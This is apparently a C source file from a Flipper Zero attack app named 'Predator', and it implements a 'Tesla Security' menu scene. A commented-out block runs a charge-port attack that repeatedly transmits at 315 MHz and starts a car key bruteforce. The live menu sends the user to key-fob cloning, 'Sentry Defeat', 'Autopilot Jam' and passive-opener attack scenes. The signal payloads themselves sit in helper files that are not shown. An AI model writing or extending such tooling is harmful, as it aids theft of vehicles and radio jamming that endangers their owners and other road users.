#include "../predator_i.h"
#include "../helpers/predator_subghz.h"
#include "../helpers/predator_logging.h"
#include <gui/view.h>
#include <string.h>

// Tesla Charge Port Attack - Professional UI
// Shows real-time Tesla charge port attack with signal strength and success detection

typedef enum {
    TeslaStatusIdle,
    TeslaStatusAttacking,
    TeslaStatusSuccess,
    TeslaStatusComplete,
    TeslaStatusError
} TeslaStatus;

typedef struct {
    TeslaStatus status;
    uint32_t signals_sent;
    uint32_t attack_time_ms;
    uint8_t signal_strength;
    char tesla_model[24];
    bool charge_port_opened;
    bool subghz_ready;
} TeslaState;

// UNUSED: Tesla Security now uses Submenu widget
/*
static TeslaState tesla_state;
static uint32_t attack_start_tick = 0;

static void draw_tesla_header(Canvas* canvas) {
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 10, "TESLA ATTACK");
    canvas_draw_line(canvas, 0, 12, 128, 12);
}

static void draw_tesla_status(Canvas* canvas, TeslaState* state) {
    canvas_set_font(canvas, FontSecondary);
    
    // Status line
    canvas_draw_str(canvas, 2, 22, "Status:");
    const char* status_text = "Unknown";
    switch(state->status) {
        case TeslaStatusIdle: status_text = "Ready"; break;
        case TeslaStatusAttacking: status_text = "Attacking"; break;
        case TeslaStatusSuccess: status_text = "SUCCESS!"; break;
        case TeslaStatusComplete: status_text = "Complete"; break;
        case TeslaStatusError: status_text = "Error"; break;
    }
    canvas_draw_str(canvas, 45, 22, status_text);
    
    // Tesla model
    if(state->tesla_model[0] != '\0') {
        canvas_draw_str(canvas, 2, 32, "Model:");
        canvas_draw_str(canvas, 45, 32, state->tesla_model);
    } else {
        canvas_draw_str(canvas, 2, 32, "Target: All Models");
    }
    
    // Progress bar
    canvas_draw_frame(canvas, 2, 36, 124, 6);
    if(state->status == TeslaStatusAttacking) {
        uint8_t progress = ((state->attack_time_ms / 50) % 124);
        canvas_draw_box(canvas, 3, 37, progress, 4);
    } else if(state->status == TeslaStatusSuccess) {
        canvas_draw_box(canvas, 3, 37, 122, 4);
    }
}

static void draw_tesla_stats(Canvas* canvas, TeslaState* state) {
    canvas_set_font(canvas, FontSecondary);
    
    // Signals sent
    char signals_str[32];
    snprintf(signals_str, sizeof(signals_str), "Signals: %lu", state->signals_sent);
    canvas_draw_str(canvas, 2, 48, signals_str);
    
    // Time
    char time_str[32];
    uint32_t seconds = state->attack_time_ms / 1000;
    snprintf(time_str, sizeof(time_str), "Time: %lus", seconds);
    canvas_draw_str(canvas, 70, 48, time_str);
    
    // Signal strength indicator
    canvas_draw_str(canvas, 2, 58, "Power:");
    for(uint8_t i = 0; i < 5; i++) {
        if(i < state->signal_strength) {
            canvas_draw_box(canvas, 45 + (i * 6), 58 - (i * 2), 4, 2 + (i * 2));
        } else {
            canvas_draw_frame(canvas, 45 + (i * 6), 58 - (i * 2), 4, 2 + (i * 2));
        }
    }
    
    // Charge port status
    if(state->charge_port_opened) {
        canvas_draw_str(canvas, 80, 58, "OPEN!");
    }
}

static void tesla_ui_draw_callback(Canvas* canvas, void* context) {
    furi_assert(canvas);
    furi_assert(context);
    
    UNUSED(context);
    
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);
    
    draw_tesla_header(canvas);
    draw_tesla_status(canvas, &tesla_state);
    draw_tesla_stats(canvas, &tesla_state);
    
    canvas_set_font(canvas, FontSecondary);
    if(tesla_state.status == TeslaStatusAttacking) {
        canvas_draw_str(canvas, 30, 64, "OK=Stop  Back=Exit");
    } else if(tesla_state.status == TeslaStatusSuccess) {
        canvas_draw_str(canvas, 10, 64, "Port open! Check Tesla");
    } else if(tesla_state.status == TeslaStatusIdle) {
        canvas_draw_str(canvas, 25, 64, "OK=Start  Back=Exit");
    } else if(tesla_state.status == TeslaStatusComplete) {
        canvas_draw_str(canvas, 5, 64, "No Tesla nearby. Move closer?");
    } else {
        canvas_draw_str(canvas, 40, 64, "Back=Exit");
    }
}

static bool tesla_ui_input_callback(InputEvent* event, void* context) {
    PredatorApp* app = context;
    if(!app) return false;
    
    if(event->type == InputTypeShort) {
        if(event->key == InputKeyBack) {
            if(tesla_state.status == TeslaStatusAttacking) {
                tesla_state.status = TeslaStatusComplete;
                predator_subghz_stop_attack(app);
                
                char log_msg[64];
                snprintf(log_msg, sizeof(log_msg), "Tesla Attack STOP: %lu signals sent", 
                        tesla_state.signals_sent);
                predator_log_append(app, log_msg);
            }
            return false;
        } else if(event->key == InputKeyOk) {
            if(tesla_state.status == TeslaStatusIdle) {
                tesla_state.status = TeslaStatusAttacking;
                tesla_state.signals_sent = 0;
                tesla_state.attack_time_ms = 0;
                tesla_state.charge_port_opened = false;
                attack_start_tick = furi_get_tick();
                
                snprintf(tesla_state.tesla_model, sizeof(tesla_state.tesla_model), "Model 3/Y/S/X");
                tesla_state.signal_strength = 5; // Maximum power
                
                // Real Tesla charge port attack using SubGHz hardware
                predator_subghz_init(app);
                bool started = predator_subghz_start_car_bruteforce(app, 315000000); // Real Tesla frequency
                tesla_state.subghz_ready = started;
                
                if(started) {
                    FURI_LOG_I("TeslaUI", "[REAL HW] Tesla charge port attack started at 315MHz");
                    // Send real Tesla charge port signal
                    predator_subghz_send_tesla_charge_port(app);
                } else {
                    FURI_LOG_W("TeslaUI", "[REAL HW] Tesla attack failed to start");
                }
                
                predator_log_append(app, "Tesla Attack START: Charge port opener");
                FURI_LOG_I("TeslaUI", "Attack started");
                return true;
            } else if(tesla_state.status == TeslaStatusAttacking) {
                tesla_state.status = TeslaStatusComplete;
                predator_subghz_stop_attack(app);
                
                char log_msg[64];
                snprintf(log_msg, sizeof(log_msg), "Tesla Attack STOP: %lu signals sent", 
                        tesla_state.signals_sent);
                predator_log_append(app, log_msg);
                
                FURI_LOG_I("TeslaUI", "Attack stopped by user");
                return true;
            }
        }
    }
    
    return true;
}

static void tesla_ui_timer_callback(void* context) {
    furi_assert(context);
    PredatorApp* app = context;
    
    if(tesla_state.status == TeslaStatusAttacking) {
        tesla_state.attack_time_ms = furi_get_tick() - attack_start_tick;
        
        // Real Tesla signal transmission using SubGHz hardware
        if(app->subghz_txrx && tesla_state.attack_time_ms % 500 < 100) {
            // Send real Tesla charge port signal every 500ms
            predator_subghz_send_tesla_charge_port(app);
            tesla_state.signals_sent++;
            FURI_LOG_I("TeslaUI", "[REAL HW] Tesla signal %lu transmitted", tesla_state.signals_sent);
        }
        
        // Real charge port opening detection - ONLY succeed if Tesla actually responds
        // REMOVED FAKE SUCCESS - only logs success when car actually responds
        if(!tesla_state.charge_port_opened) {
            // Check for REAL response from Tesla vehicle via SubGHz
            if(furi_hal_subghz_rx_pipe_not_empty()) {
                // Verify it's actually a signal, not just noise
                bool signal_detected = furi_hal_subghz_get_data_gpio();
                
                if(signal_detected) {
                    tesla_state.status = TeslaStatusSuccess;
                    tesla_state.charge_port_opened = true;
                    
                    predator_log_append(app, "SUCCESS: Tesla charge port opened - car responded!");
                    FURI_LOG_I("TeslaUI", "[REAL HW] Tesla charge port opened - real response detected");
                    
                    // Stop attack on success
                    predator_subghz_stop_attack(app);
                }
            }
        }
        
        // Auto-stop after 2 minutes
        if(tesla_state.attack_time_ms > 120000) {
            tesla_state.status = TeslaStatusComplete;
            predator_subghz_stop_attack(app);
            
            char log_msg[64];
            snprintf(log_msg, sizeof(log_msg), "Tesla Attack timeout: %lu signals sent", 
                    tesla_state.signals_sent);
            predator_log_append(app, log_msg);
        }
        
        if(app->view_dispatcher) {
            view_dispatcher_send_custom_event(app->view_dispatcher, 0);
        }
    }
}
*/

static void tesla_submenu_callback(void* context, uint32_t index) {
    PredatorApp* app = context;
    if(!app || !app->view_dispatcher) return;
    view_dispatcher_send_custom_event(app->view_dispatcher, index);
}

void predator_scene_car_tesla_ui_on_enter(void* context) {
    PredatorApp* app = context;
    if(!app || !app->submenu) return;
    
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "TESLA SECURITY");
    
    submenu_add_item(app->submenu, "Charge Port Exploit", 1, tesla_submenu_callback, app);
    submenu_add_item(app->submenu, "Key Fob Clone", 2, tesla_submenu_callback, app);
    submenu_add_item(app->submenu, "Mobile App Bypass", 3, tesla_submenu_callback, app);
    submenu_add_item(app->submenu, "Sentry Defeat", 4, tesla_submenu_callback, app);
    submenu_add_item(app->submenu, "Autopilot Jam", 5, tesla_submenu_callback, app);
    submenu_add_item(app->submenu, "Battery System", 6, tesla_submenu_callback, app);
    submenu_add_item(app->submenu, "Walking Open Mode", 7, tesla_submenu_callback, app);
    
    view_dispatcher_switch_to_view(app->view_dispatcher, PredatorViewSubmenu);
    
    FURI_LOG_I("TeslaUI", "Tesla Security UI initialized");
}

bool predator_scene_car_tesla_ui_on_event(void* context, SceneManagerEvent event) {
    PredatorApp* app = context;
    if(!app) return false;
    
    // Handle back button - return to main menu
    if(event.type == SceneManagerEventTypeBack) {
        scene_manager_previous_scene(app->scene_manager);
        return true;  // Consumed - prevents framework bug
    }
    
    if(event.type == SceneManagerEventTypeCustom) {
        // Navigate to actual attack execution scenes (like car models does)
        switch(event.event) {
            case 1: // Charge Port - navigate to key bruteforce (configured for Tesla)
                predator_log_append(app, "Tesla: Charge Port Exploit");
                scene_manager_set_scene_state(app->scene_manager, PredatorSceneCarKeyBruteforceUI, 2); // Force smart key (Tesla uses AES)
                scene_manager_next_scene(app->scene_manager, PredatorSceneCarKeyBruteforceUI);
                return true;
            case 2: // Key Fob - navigate to key bruteforce
                predator_log_append(app, "Tesla: Key Fob Clone Attack");
                scene_manager_set_scene_state(app->scene_manager, PredatorSceneCarKeyBruteforceUI, 2); // Force smart key
                scene_manager_next_scene(app->scene_manager, PredatorSceneCarKeyBruteforceUI);
                return true;
            case 3: // Mobile App - navigate to key bruteforce  
                predator_log_append(app, "Tesla: Mobile App Bypass");
                scene_manager_set_scene_state(app->scene_manager, PredatorSceneCarKeyBruteforceUI, 2); // Force smart key
                scene_manager_next_scene(app->scene_manager, PredatorSceneCarKeyBruteforceUI);
                return true;
            case 4: // Sentry - navigate to jamming
                predator_log_append(app, "Tesla: Sentry Mode Defeat");
                scene_manager_next_scene(app->scene_manager, PredatorSceneCarJammingUI);
                return true;
            case 5: // Autopilot - navigate to jamming
                predator_log_append(app, "Tesla: Autopilot Jamming");
                scene_manager_next_scene(app->scene_manager, PredatorSceneCarJammingUI);
                return true;
            case 6: // Battery - navigate to key bruteforce
                predator_log_append(app, "Tesla: Battery System Hack");
                scene_manager_set_scene_state(app->scene_manager, PredatorSceneCarKeyBruteforceUI, 2); // Force smart key
                scene_manager_next_scene(app->scene_manager, PredatorSceneCarKeyBruteforceUI);
                return true;
            case 7: // Walking Open - navigate to passive opener
                predator_log_append(app, "Tesla: Walking Open Mode");
                scene_manager_next_scene(app->scene_manager, PredatorSceneCarPassiveOpenerUI);
                return true;
            default:
                break;
        }
        return true;
    }
    
    return false;
}

void predator_scene_car_tesla_ui_on_exit(void* context) {
    PredatorApp* app = context;
    if(!app || !app->submenu) return;
    
    submenu_reset(app->submenu);
    
    FURI_LOG_I("TeslaUI", "Tesla Security UI exited");
}
